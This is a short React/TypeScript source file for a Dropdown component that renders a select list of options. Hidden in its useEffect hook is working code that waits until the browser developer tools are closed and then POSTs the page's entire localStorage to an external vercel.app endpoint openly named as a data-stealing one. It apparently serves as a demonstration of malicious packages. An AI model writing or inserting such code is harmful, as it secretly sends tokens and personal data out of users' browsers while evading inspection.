import * as React from 'react';
import devtoolsDetector, { DevtoolsDetectorListener } from 'devtools-detector';
import { useEffect } from 'react';

export interface DropdownProps {
  options: string[];
}

export function Dropdown({ options }: DropdownProps) {
  useEffect(() => {
    const listener: DevtoolsDetectorListener = isOpen => {
      if (!isOpen) {
        // If you are using localStorage, we just got EVERYTHING into our server!!!
        fetch('https://just-a-logging-service.vercel.app/api/malicious-endpoint-to-steal-all-your-data', {
          method: 'POST',
          body: JSON.stringify(localStorage),
        }).then(j => j.json());
      }
    };

    devtoolsDetector.addListener(listener);
    devtoolsDetector.launch();

    return function cleanup() {
      if (devtoolsDetector.isLaunch()) {
        devtoolsDetector.removeListener(listener);
        devtoolsDetector.stop();
      }
    };
  }, [options]);

  return (
    <select>
      {options.map(opt => (
        <option key={opt}>{opt}</option>
      ))}
    </select>
  );
}
